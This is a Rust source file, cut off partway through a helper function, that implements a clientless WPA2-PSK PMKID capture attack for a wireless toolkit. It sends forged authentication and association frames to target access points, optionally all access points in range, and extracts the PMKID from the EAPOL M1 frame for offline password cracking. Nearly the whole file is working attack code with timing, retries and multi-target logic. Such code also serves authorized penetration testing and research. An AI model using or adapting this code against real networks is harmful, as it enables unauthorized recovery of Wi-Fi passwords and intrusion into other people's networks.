//! PMKID active attack — clientless WPA2-PSK PMKID extraction.
//!
//! For each target AP:
//!   1. Lock the shared adapter to target's channel
//!   2. Send Authentication (Open System, seq=1)
//!   3. Wait for Authentication Response (status=0)
//!   4. Send Association Request (IEs mirror AP capabilities)
//!   5. Wait for Association Response (status=0)
//!   6. Listen for EAPOL M1 from AP → extract PMKID from Key Data RSN IE
//!   7. Send Disassociation (cleanup)
//!   8. Unlock channel
//!
//! Silent attack — no clients are deauthed, no disruption. Works on any
//! WPA2-PSK AP that includes PMKID in its M1 (most do). Some APs don't
//! include PMKID — those return `PmkidStatus::NoPmkid`.
//!
//! Architecture (SharedAdapter):
//!   The attack receives targets from the running scanner (no internal scan).
//!   It shares the adapter with the scanner via SharedAdapter. Before attacking
//!   each target, it locks the channel. The scanner pauses hopping but keeps
//!   processing frames on the locked channel. After each target, the channel
//!   unlocks and the scanner resumes hopping.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_pmkid.c`.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::parsed_frame::{FrameBody, DataPayload};
use crate::engine::capture::{self as capture_engine, CaptureDatabase, CaptureEvent};
use crate::store::Ap;
use crate::protocol::eapol;
use crate::protocol::frames;
use crate::protocol::ie::{self, AssocTarget};
use crate::protocol::ieee80211::{
    auth_algo, cap_info,
    ReasonCode, Security, StatusCode, WifiGeneration,
};

// ═══════════════════════════════════════════════════════════════════════════════
//  PMKID Attack Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the PMKID attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct PmkidParams {
    // === Target ===
    /// Target AP BSSID. None = attack all eligible APs.
    pub bssid: Option<MacAddress>,
    /// Target AP SSID. None = any (used with bssid, or for multi-target).
    pub ssid: Option<String>,

    // === Timing ===
    /// Timeout waiting for authentication response from AP. Default: 500ms.
    pub auth_timeout: Duration,
    /// Timeout waiting for association response from AP. Default: 500ms.
    pub assoc_timeout: Duration,
    /// Timeout waiting for EAPOL M1 with PMKID after association. Default: 2000ms.
    pub m1_timeout: Duration,
    /// Delay between retries of auth/assoc frames. Default: 100ms.
    pub retry_delay: Duration,
    /// Wait after channel lock for PLL lock + AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// Overall attack timeout (0 = no limit). Default: 0 (no limit).
    pub timeout: Duration,

    // === Limits ===
    /// Max authentication retries per target. Default: 3.
    pub auth_retries: u32,
    /// Max association retries per target. Default: 3.
    pub assoc_retries: u32,
    /// Max targets to attack (0 = all eligible). Default: 0.
    pub max_targets: u32,
    /// Minimum RSSI threshold in dBm. APs weaker than this are skipped. Default: -90.
    pub rssi_min_dbm: i8,

    // === Behavior ===
    /// Send disassociation after attack (be polite). Default: true.
    pub disassoc_after: bool,
    /// Attack all eligible WPA2+ APs (multi-target mode). Default: false.
    pub attack_all: bool,
    /// Output file prefix for captured PMKIDs. Default: "/tmp/wifikit_pmkid".
    pub output_prefix: String,
    /// Delay between attacking consecutive targets in multi-target mode.
    /// Gives the USB adapter breathing room to avoid lockup. Default: 100ms.
    pub inter_target_delay: Duration,
    /// RX poll timeout slice for frame reception loops. Default: 200ms.
    pub rx_poll_timeout: Duration,
}

impl Default for PmkidParams {
    fn default() -> Self {
        Self {
            bssid: None,
            ssid: None,
            auth_timeout: Duration::from_millis(500),
            assoc_timeout: Duration::from_millis(500),
            m1_timeout: Duration::from_millis(2000),
            retry_delay: Duration::from_millis(100),
            channel_settle: Duration::from_millis(50),
            timeout: Duration::ZERO,
            auth_retries: 3,
            assoc_retries: 3,
            max_targets: 0,
            rssi_min_dbm: -90,
            disassoc_after: true,
            attack_all: false,
            output_prefix: "/tmp/wifikit_pmkid".to_string(),
            inter_target_delay: Duration::from_millis(100),
            rx_poll_timeout: Duration::from_millis(200),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PMKID Attack Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Current attack phase.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PmkidPhase {
    /// Initial state — not started.
    Idle,
    /// Locking channel to target AP.
    ChannelLock,
    /// Sending authentication frame.
    Authenticating,
    /// Waiting for auth response.
    WaitingAuthResp,
    /// Sending association request.
    Associating,
    /// Waiting for assoc response.
    WaitingAssocResp,
    /// Waiting for EAPOL M1 with PMKID.
    WaitingM1,
    /// Cleaning up (disassociate).
    Cleanup,
    /// Attack completed.
    Done,
}

impl Default for PmkidPhase {
    fn default() -> Self {
        Self::Idle
    }
}

/// Status of a single PMKID capture attempt.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PmkidStatus {
    /// PMKID successfully captured.
    Captured,
    /// AP sent M1 but without PMKID — AP doesn't include it.
    NoPmkid,
    /// AP didn't respond to authentication.
    NoResponse,
    /// AP rejected association.
    AssocRejected,
    /// Timed out waiting for M1.
    Timeout,
    /// Channel lock failed (another attack holds it).
    ChannelError,
    /// Attack was stopped before completion.
    Stopped,
    /// In progress — not yet completed.
    InProgress,
}

impl Default for PmkidStatus {
    fn default() -> Self {
        Self::InProgress
    }
}

/// Real-time info snapshot for the CLI to render.
#[derive(Debug, Clone)]
pub struct PmkidInfo {
    // === State ===
    pub phase: PmkidPhase,
    pub running: bool,

    // === Current target ===
    pub current_bssid: Option<MacAddress>,
    pub current_ssid: String,
    pub current_channel: u8,
    pub current_rssi: i8,

    // === Progress ===
    pub target_index: u32,
    pub target_total: u32,
    pub auth_attempt: u32,
    pub assoc_attempt: u32,

    // === Counters ===
    pub frames_sent: u64,
    pub frames_received: u64,
    pub pmkids_captured: u32,
    pub pmkids_failed: u32,
    pub aps_no_pmkid: u32,
    pub aps_no_response: u32,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === Results ===
    /// Per-target results for live rendering. Capped at MAX_INFO_RESULTS to keep
    /// cloning cheap. Full results are in PmkidFinalResult after attack completes.
    pub results: Vec<PmkidResult>,
    /// Total number of targets completed (may exceed results.len() if capped).
    pub results_count: u32,
}

impl Default for PmkidInfo {
    fn default() -> Self {
        Self {
            phase: PmkidPhase::Idle,
            running: false,
            start_time: Instant::now(),
            current_bssid: None,
            current_ssid: String::new(),
            current_channel: 0,
            current_rssi: -100,
            target_index: 0,
            target_total: 0,
            auth_attempt: 0,
            assoc_attempt: 0,
            frames_sent: 0,
            frames_received: 0,
            pmkids_captured: 0,
            pmkids_failed: 0,
            aps_no_pmkid: 0,
            aps_no_response: 0,
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            results: Vec::new(),
            results_count: 0,
        }
    }
}

/// Maximum number of per-target results kept in PmkidInfo for live rendering.
const MAX_INFO_RESULTS: usize = 64;

// ═══════════════════════════════════════════════════════════════════════════════
//  PMKID Attack Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event fired during the PMKID attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct PmkidEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: PmkidEventKind,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum PmkidEventKind {
    /// Starting attack against a specific AP.
    TargetStarted {
        bssid: MacAddress,
        ssid: String,
        channel: u8,
        rssi: i8,
        index: u32,
        total: u32,
    },
    /// Channel locked for target.
    ChannelLocked { channel: u8 },
    /// Authentication frame sent.
    AuthSent { bssid: MacAddress, attempt: u32 },
    /// Authentication response received.
    AuthResponse { bssid: MacAddress, status: u16 },
    /// Authentication succeeded.
    AuthSuccess { bssid: MacAddress },
    /// Authentication failed (all retries exhausted).
    AuthFailed { bssid: MacAddress },
    /// Association request sent.
    AssocSent { bssid: MacAddress, attempt: u32 },
    /// Association response received.
    AssocResponse { bssid: MacAddress, status: u16, aid: u16 },
    /// Association succeeded.
    AssocSuccess { bssid: MacAddress },
    /// Association failed (all retries exhausted).
    AssocFailed { bssid: MacAddress },
    /// EAPOL M1 received (with or without PMKID).
    EapolM1Received { bssid: MacAddress, has_pmkid: bool },
    /// PMKID captured!
    PmkidCaptured {
        bssid: MacAddress,
        ssid: String,
        pmkid: [u8; 16],
        channel: u8,
        rssi: i8,
        elapsed_ms: u64,
    },
    /// No PMKID in M1 — AP doesn't include it.
    NoPmkid { bssid: MacAddress, ssid: String },
    /// Timed out waiting for M1.
    M1Timeout { bssid: MacAddress, ssid: String },
    /// No response from AP at all.
    NoResponse { bssid: MacAddress, ssid: String },
    /// Disassociation sent (cleanup).
    DisassocSent { bssid: MacAddress },
    /// Channel unlocked after target.
    ChannelUnlocked,
    /// Single target attack completed.
    TargetComplete {
        bssid: MacAddress,
        ssid: String,
        status: PmkidStatus,
        elapsed_ms: u64,
    },
    /// All targets attacked, attack complete.
    AttackComplete {
        captured: u32,
        failed: u32,
        total: u32,
        elapsed: Duration,
    },
    /// Non-fatal error during attack.
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PMKID Attack Result — per-target outcome
// ═══════════════════════════════════════════════════════════════════════════════

/// Result for a single AP target.
#[derive(Debug, Clone)]
pub struct PmkidResult {
    pub bssid: MacAddress,
    pub ssid: String,
    pub channel: u8,
    pub rssi: i8,
    pub status: PmkidStatus,
    pub pmkid: Option<[u8; 16]>,
    pub anonce: Option<[u8; 32]>,
    pub key_version: u16,
    pub elapsed: Duration,
}

/// Final result after all targets attacked.
#[allow(dead_code)]
#[derive(Debug, Clone, Default)]
pub struct PmkidFinalResult {
    pub results: Vec<PmkidResult>,
    pub total_captured: u32,
    pub total_failed: u32,
    pub total_no_pmkid: u32,
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PmkidAttack — the attack engine (SharedAdapter architecture)
// ═══════════════════════════════════════════════════════════════════════════════

/// PMKID attack engine.
///
/// Uses SharedAdapter for all adapter access. Spawns its own thread via start().
/// The scanner keeps running alongside — channel contention is managed by the
/// SharedAdapter's channel lock mechanism.
pub struct PmkidAttack {
    params: PmkidParams,
    info: Arc<Mutex<PmkidInfo>>,
    events: Arc<EventRing<PmkidEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl PmkidAttack {
    pub fn new(params: PmkidParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(PmkidInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the PMKID attack on a background thread.
    ///
    /// `targets` are the eligible APs from the scanner. The caller filters them
    /// before passing (by BSSID, SSID, RSSI threshold, security type).
    /// The attack uses SharedAdapter for all adapter access.
    pub fn start(&self, shared: SharedAdapter, targets: Vec<Ap>) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.target_total = targets.len() as u32;
            info.phase = if targets.is_empty() { PmkidPhase::Done } else { PmkidPhase::ChannelLock };
        }

        thread::Builder::new()
            .name("pmkid".into())
            .spawn(move || {
                // Subscribe to pipeline for RX frames (independent of TX path)
                let reader = shared.subscribe("pmkid");
                run_pmkid_attack(&shared, &reader, &targets, &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = PmkidPhase::Done;
                }
            })
            .expect("failed to spawn pmkid thread");
    }

    /// Signal the attack to stop. Non-blocking.
    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Check if the attack has finished.
    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    /// Check if the attack is currently running.
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get current info snapshot for rendering.
    pub fn info(&self) -> PmkidInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Drain new events since last call.
    pub fn events(&self) -> Vec<PmkidEvent> {
        self.events.drain()
    }

    /// Human-readable name.
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "pmkid"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread via start()
// ═══════════════════════════════════════════════════════════════════════════════

fn run_pmkid_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    targets: &[Ap],
    params: &PmkidParams,
    info: &Arc<Mutex<PmkidInfo>>,
    events: &Arc<EventRing<PmkidEvent>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let our_mac = shared.mac();
    let mut total_captured: u32 = 0;
    let mut total_failed: u32 = 0;
    let mut _total_no_pmkid: u32 = 0;
    let mut results: Vec<PmkidResult> = Vec::new();

    for (idx, target) in targets.iter().enumerate() {
        if !running.load(Ordering::SeqCst) {
            break;
        }

        // Check max_targets limit
        if params.max_targets > 0 && idx as u32 >= params.max_targets {
            break;
        }

        // Check overall timeout
        if params.timeout > Duration::ZERO && start.elapsed() >= params.timeout {
            break;
        }

        // Inter-target delay — give USB adapter breathing room
        if idx > 0 && params.inter_target_delay > Duration::ZERO {
            thread::sleep(params.inter_target_delay);
        }

        // Update elapsed so status bar timer works
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.elapsed = start.elapsed();
        }

        let result = attack_single_ap(
            shared, reader, target, params, &our_mac,
            info, events, running, start, idx as u32, targets.len() as u32,
        );

        match result.status {
            PmkidStatus::Captured => total_captured += 1,
            PmkidStatus::NoPmkid => _total_no_pmkid += 1,
            _ => total_failed += 1,
        }

        results.push(result);

        // Update info.results incrementally for live rendering
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.results_count = results.len() as u32;
            if results.len() <= MAX_INFO_RESULTS {
                info.results = results.clone();
            } else {
                info.results = results[results.len() - MAX_INFO_RESULTS..].to_vec();
            }
        }
    }

    let elapsed = start.elapsed();

    push_event(events, start, PmkidEventKind::AttackComplete {
        captured: total_captured,
        failed: total_failed,
        total: results.len() as u32,
        elapsed,
    });

    // Update info with final results
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = elapsed;
        info.results_count = results.len() as u32;
        if results.len() <= MAX_INFO_RESULTS {
            info.results = results;
        } else {
            info.results = results[results.len() - MAX_INFO_RESULTS..].to_vec();
        }
    }
}

/// Filter APs to eligible PMKID targets:
/// - WPA2 or WPA3 security (needs RSN with PMKID support)
/// - Not hidden (can't associate without SSID)
/// - Above minimum RSSI threshold
/// - If specific bssid/ssid given in params, filter to those
pub fn filter_eligible_targets(aps: &[Ap], params: &PmkidParams) -> Vec<Ap> {
    aps.iter()
        .filter(|ap| {
            matches!(
                ap.security,
                Security::Wpa2
                    | Security::Wpa2Enterprise
                    | Security::Wpa3
                    | Security::Wpa3Enterprise
            )
        })
        .filter(|ap| !ap.is_hidden && !ap.ssid.is_empty())
        .filter(|ap| ap.rssi >= params.rssi_min_dbm)
        .filter(|ap| {
            if let Some(bssid) = &params.bssid {
                return &ap.bssid == bssid;
            }
            if let Some(ssid) = &params.ssid {
                return &ap.ssid == ssid;
            }
            params.attack_all || (params.bssid.is_none() && params.ssid.is_none())
        })
        .cloned()
        .collect()
}

/// Attack a single AP using SharedAdapter.
fn attack_single_ap(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    params: &PmkidParams,
    our_mac: &MacAddress,
    info: &Arc<Mutex<PmkidInfo>>,
    events: &Arc<EventRing<PmkidEvent>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
    index: u32,
    total: u32,
) -> PmkidResult {
    let target_start = Instant::now();

    // Update info with current target
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.current_bssid = Some(target.bssid);
        info.current_ssid = target.ssid.clone();
        info.current_channel = target.channel;
        info.current_rssi = target.rssi;
        info.target_index = index + 1;
        info.auth_attempt = 0;
        info.assoc_attempt = 0;
    }

    push_event(events, attack_start, PmkidEventKind::TargetStarted {
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        rssi: target.rssi,
        index: index + 1,
        total,
    });

    let mut result = PmkidResult {
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        rssi: target.rssi,
        status: PmkidStatus::InProgress,
        pmkid: None,
        anonce: None,
        key_version: 0,
        elapsed: Duration::ZERO,
    };

    let mut capture_db = CaptureDatabase::new();

    // Step 0: Lock channel to target's channel via SharedAdapter.
    // The scanner will pause hopping and stay on this channel.
    update_phase(info, PmkidPhase::ChannelLock);
    if target.channel > 0 {
        if let Err(e) = shared.lock_channel(target.channel, "pmkid") {
            push_event(events, attack_start, PmkidEventKind::Error {
                message: format!("channel lock to ch{} failed: {e}", target.channel),
            });
            result.status = PmkidStatus::ChannelError;
            result.elapsed = target_start.elapsed();
            push_target_complete(events, attack_start, &result);
            return result;
        }
        push_event(events, attack_start, PmkidEventKind::ChannelLocked {
            channel: target.channel,
        });
        // Let radio settle — PLL lock + AGC stabilization
        thread::sleep(params.channel_settle);
    }

    // Step 1: Authentication (Open System) with retries
    update_phase(info, PmkidPhase::Authenticating);
    let mut auth_ok = false;

    for attempt in 0..=params.auth_retries {
        if !running.load(Ordering::SeqCst) {
            result.status = PmkidStatus::Stopped;
            result.elapsed = target_start.elapsed();
            shared.unlock_channel();
            push_target_complete(events, attack_start, &result);
            return result;
        }

        if attempt > 0 {
            thread::sleep(params.retry_delay);
        }

        let auth_frame = frames::build_auth(
            our_mac,
            &target.bssid,
            auth_algo::OPEN_SYSTEM,
            1, // seq=1 (request)
            StatusCode::Success,
        );

        if shared.tx_frame(&auth_frame, &TxOptions::default()).is_err() {
            continue;
        }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_sent += 1;
            info.auth_attempt = attempt + 1;
        }

        push_event(events, attack_start, PmkidEventKind::AuthSent {
            bssid: target.bssid,
            attempt: attempt + 1,
        });

        // Wait for auth response via PipelineSubscriber (no USB mutex contention)
        update_phase(info, PmkidPhase::WaitingAuthResp);
        match wait_auth_response(
            reader, &target.bssid, params.auth_timeout, running, info,
        ) {
            Some((status, seq)) => {
                push_event(events, attack_start, PmkidEventKind::AuthResponse {
                    bssid: target.bssid,
                    status,
                });

                if status == 0 && seq == 2 {
                    auth_ok = true;
                    push_event(events, attack_start, PmkidEventKind::AuthSuccess {
                        bssid: target.bssid,
                    });
                    break;
                }
            }
            None => continue,
        }
    }

    if !auth_ok {
        if running.load(Ordering::SeqCst) {
            push_event(events, attack_start, PmkidEventKind::AuthFailed {
                bssid: target.bssid,
            });
            result.status = PmkidStatus::NoResponse;
            push_event(events, attack_start, PmkidEventKind::NoResponse {
                bssid: target.bssid,
                ssid: target.ssid.clone(),
            });
        } else {
            result.status = PmkidStatus::Stopped;
        }
        result.elapsed = target_start.elapsed();
        disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info);
        shared.unlock_channel();
        push_event(events, attack_start, PmkidEventKind::ChannelUnlocked);
        push_target_complete(events, attack_start, &result);
        return result;
    }

    // Step 2: Association Request with retries
    update_phase(info, PmkidPhase::Associating);
    let mut assoc_ok = false;

    let assoc_target = AssocTarget {
        ssid: target.ssid.as_bytes().to_vec(),
        channel: target.channel,
        ds_channel: target.ds_channel,
        rsn: target.rsn.clone(),
        has_ht: target.wifi_gen >= WifiGeneration::Wifi4,
        has_vht: target.wifi_gen >= WifiGeneration::Wifi5,
        has_he: target.wifi_gen >= WifiGeneration::Wifi6,
        has_wmm: target.has_wmm,
        max_nss: target.max_nss.max(1),
    };
    let ies = ie::build_assoc_ies(&assoc_target);
    let cap = cap_info::ESS | cap_info::SHORT_PREAMBLE | cap_info::SHORT_SLOT;

    for attempt in 0..=params.assoc_retries {
        if !running.load(Ordering::SeqCst) {
            result.status = PmkidStatus::Stopped;
            result.elapsed = target_start.elapsed();
            shared.unlock_channel();
            push_target_complete(events, attack_start, &result);
            return result;
        }

        let assoc_frame = match frames::build_assoc_request(
            our_mac, &target.bssid, cap, 10, &ies,
        ) {
            Some(f) => f,
            None => continue,
        };

        if shared.tx_frame(&assoc_frame, &TxOptions::default()).is_err() {
            continue;
        }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_sent += 1;
            info.assoc_attempt = attempt + 1;
        }

        push_event(events, attack_start, PmkidEventKind::AssocSent {
            bssid: target.bssid,
            attempt: attempt + 1,
        });

        // Wait for assoc response — parse via protocol layer
        update_phase(info, PmkidPhase::WaitingAssocResp);
        match wait_assoc_response(
            reader, &target.bssid, params.assoc_timeout, running, info,
        ) {
            Some((status, aid)) => {
                push_event(events, attack_start, PmkidEventKind::AssocResponse {
                    bssid: target.bssid,
                    status,
                    aid,
                });

                if status == 0 {
                    assoc_ok = true;
                    push_event(events, attack_start, PmkidEventKind::AssocSuccess {
                        bssid: target.bssid,
                    });
                    break;
                }
            }
            None => {
                if attempt < params.assoc_retries {
                    thread::sleep(params.retry_delay);
                }
                continue;
            }
        }
    }

    if !assoc_ok {
        push_event(events, attack_start, PmkidEventKind::AssocFailed {
            bssid: target.bssid,
        });
        // Don't give up — some APs send M1 after auth alone (hcxdumptool style)
    }

    // Step 3: Wait for EAPOL M1 with PMKID
    update_phase(info, PmkidPhase::WaitingM1);

    match wait_eapol_m1(
        reader, &target.bssid, our_mac,
        params.m1_timeout, running, info, events, attack_start,
        &mut capture_db, &target.ssid,
    ) {
        EapolResult::PmkidCaptured { pmkid, anonce, key_version } => {
            result.status = PmkidStatus::Captured;
            result.pmkid = Some(pmkid);
            result.anonce = Some(anonce);
            result.key_version = key_version;

            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.pmkids_captured += 1;
            }

            push_event(events, attack_start, PmkidEventKind::PmkidCaptured {
                bssid: target.bssid,
                ssid: target.ssid.clone(),
                pmkid,
                channel: target.channel,
                rssi: target.rssi,
                elapsed_ms: target_start.elapsed().as_millis() as u64,
            });
        }
        EapolResult::M1NoPmkid { anonce, key_version } => {
            result.status = PmkidStatus::NoPmkid;
            result.anonce = Some(anonce);
            result.key_version = key_version;

            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.aps_no_pmkid += 1;
            }

            push_event(events, attack_start, PmkidEventKind::NoPmkid {
                bssid: target.bssid,
                ssid: target.ssid.clone(),
            });
        }
        EapolResult::Timeout => {
            result.status = if assoc_ok {
                PmkidStatus::Timeout
            } else {
                PmkidStatus::AssocRejected
            };

            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.pmkids_failed += 1;
            }

            push_event(events, attack_start, PmkidEventKind::M1Timeout {
                bssid: target.bssid,
                ssid: target.ssid.clone(),
            });
        }
        EapolResult::Stopped => {
            result.status = PmkidStatus::Stopped;
        }
    }

    // Step 4: Cleanup + unlock channel
    disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info);
    shared.unlock_channel();
    push_event(events, attack_start, PmkidEventKind::ChannelUnlocked);

    result.elapsed = target_start.elapsed();

    // Update info elapsed
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = attack_start.elapsed();
        let secs = info.elapsed.as_secs_f64();
        if secs > 0.0 {
            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
        }
    }

    push_target_complete(events, attack_start, &result);
    result
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame waiting helpers — all use SharedAdapter
// ═══════════════════════════════════════════════════════════════════════════════

/// Wait for an Authentication Response from a specific BSSID.
///
/// Reads pre-parsed FrameBody::Auth from ParsedFrame — no raw byte parsing.
/// Returns `Some((status, seq))` on match, `None` on timeout.
fn wait_auth_response(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    timeout: Duration,
    _running: &Arc<AtomicBool>,
    info: &Arc<Mutex<PmkidInfo>>,
) -> Option<(u16, u16)> {
    let target_bssid = *bssid;
    let info_clone = Arc::clone(info);

    reader.wait_for_with(
        |frame| {
            matches!(&frame.body, FrameBody::Auth { bssid: b, .. } if *b == target_bssid)
        },
        |frame| {
            let _ = frame;
            let mut info = info_clone.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_received += 1;
            info.elapsed = info.start_time.elapsed();
        },
        timeout,
    ).and_then(|frame| {
        match &frame.body {
            FrameBody::Auth { status, seq_num, .. } => Some((*status, *seq_num)),
            _ => None,
        }
    })
}

/// Wait for an Association Response from a specific BSSID.
///
/// Reads pre-parsed FrameBody::AssocResp from ParsedFrame — no raw byte parsing.
/// Returns `Some((status, aid))` on match, `None` on timeout.
fn wait_assoc_response(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    timeout: Duration,
    _running: &Arc<AtomicBool>,
    info: &Arc<Mutex<PmkidInfo>>,
) -> Option<(u16, u16)> {
    let target_bssid = *bssid;
    let info_clone = Arc::clone(info);

    reader.wait_for_with(
        |frame| {
            matches!(&frame.body, FrameBody::AssocResp { bssid: b, .. } if *b == target_bssid)
        },
        |frame| {
            let _ = frame;
            let mut info = info_clone.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_received += 1;
            info.elapsed = info.start_time.elapsed();
        },
        timeout,
    ).and_then(|frame| {
        match &frame.body {
            FrameBody::AssocResp { status, aid, .. } => Some((*status, *aid)),
            _ => None,
        }
    })
}

/// Result of waiting for an EAPOL M1 frame.
enum EapolResult {
    PmkidCaptured {
        pmkid: [u8; 16],
        anonce: [u8; 32],
        key_version: u16,
    },
    M1NoPmkid {
        anonce: [u8; 32],
        key_version: u16,
    },
    Timeout,
    Stopped,
}

/// Wait for EAPOL M1 frame and extract PMKID via the capture engine.
fn wait_eapol_m1(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    our_mac: &MacAddress,
    timeout: Duration,
    running: &Arc<AtomicBool>,
    info: &Arc<Mutex<PmkidInfo>>,
    events: &Arc<EventRing<PmkidEvent>>,
    attack_start: Instant,
    capture_db: &mut CaptureDatabase,
    ssid: &str,
) -> EapolResult {
    let deadline = Instant::now() + timeout;

    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now >= deadline {
            return EapolResult::Timeout;
        }

        let remaining = deadline - now;
        let poll_timeout = remaining.min(Duration::from_millis(10));

        match reader.recv_timeout(poll_timeout) {
            Some(frame) => {
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                }

                if is_eapol_data_frame(&*frame, bssid) {
                    if let Some(eapol_data) = extract_eapol_from_data_frame(&*frame) {
                        let capture_events = capture_engine::process_eapol_frame(
                            capture_db, *bssid, *our_mac, ssid, &eapol_data, 0,
                        );

                        for event in capture_events {
                            match event {
                                CaptureEvent::PmkidCaptured { pmkid, .. } => {
                                    push_event(events, attack_start, PmkidEventKind::EapolM1Received {
                                        bssid: *bssid,
                                        has_pmkid: true,
                                    });

                                    if let Some(hs) = capture_db.best_handshake(bssid) {
                                        if let Some(anonce) = hs.anonce {
                                            return EapolResult::PmkidCaptured {
                                                pmkid,
                                                anonce,
                                                key_version: hs.key_version,
                                            };
                                        }
                                    }
                                }
                                CaptureEvent::HandshakeMessage { message, .. } => {
                                    if message == eapol::HandshakeMessage::M1 {
                                        push_event(events, attack_start, PmkidEventKind::EapolM1Received {
                                            bssid: *bssid,
                                            has_pmkid: false,
                                        });
                                        if let Some(hs) = capture_db.best_handshake(bssid) {
                                            if let Some(anonce) = hs.anonce {
                                                if hs.has_pmkid {
                                                    if let Some(pmkid) = hs.pmkid {
                                                        return EapolResult::PmkidCaptured {
                                                            pmkid,
                                                            anonce,
                                                            key_version: hs.key_version,
                                                        };
                                                    }
                                                } else {
                                                    return EapolResult::M1NoPmkid {
                                                        anonce,
                                                        key_version: hs.key_version,
                                                    };
                                                }
                                            }
                                        }
                                    }
                                }
                                _ => {}
                            }
                        }
                    }
                }
            }
            None => continue, // No frame available in this poll cycle
        }
    }

    EapolResult::Stopped
}

/// Check if a received frame is an EAPOL data frame from a specific BSSID.
///
/// Uses `ieee80211::eapol::LLC_SNAP` from the protocol layer to detect
/// EAPOL frames instead of hardcoding LLC/SNAP bytes.
fn is_eapol_data_frame(frame: &crate::core::ParsedFrame, bssid: &MacAddress) -> bool {
    use crate::core::parsed_frame::{FrameBody, DataPayload};

    // Check if this is a data frame with EAPOL payload from the target BSSID
    match &frame.body {
        FrameBody::Data { bssid: frame_bssid, payload, .. } => {
            frame_bssid == bssid && matches!(
                payload,
                DataPayload::Eapol(_) | DataPayload::Llc { ethertype: 0x888E }
            )
        }
        _ => false,
    }
}

/// Extract raw EAPOL payload from a ParsedFrame data frame (after LLC/SNAP header).
///
/// Uses pre-parsed FrameBody::Data to detect EAPOL, then extracts raw bytes
/// for the capture engine (which still accepts raw EAPOL bytes).
fn extract_eapol_from_data_frame(frame: &crate::core::ParsedFrame) -> Option<Vec<u8>> {
    // Extract raw EAPOL bytes if ParsedFrame identified this as EAPOL data
    let is_eapol = matches!(&frame.body,
        FrameBody::Data { payload: DataPayload::Eapol(_), .. }
        | FrameBody::Data { payload: DataPayload::Llc { ethertype: 0x888E }, .. }
    );
    if is_eapol {
        let llc_off: usize = if frame.is_qos { 26 } else { 24 };
        // Skip LLC/SNAP header (8 bytes) to get raw EAPOL
        let eapol_off = llc_off + 8;
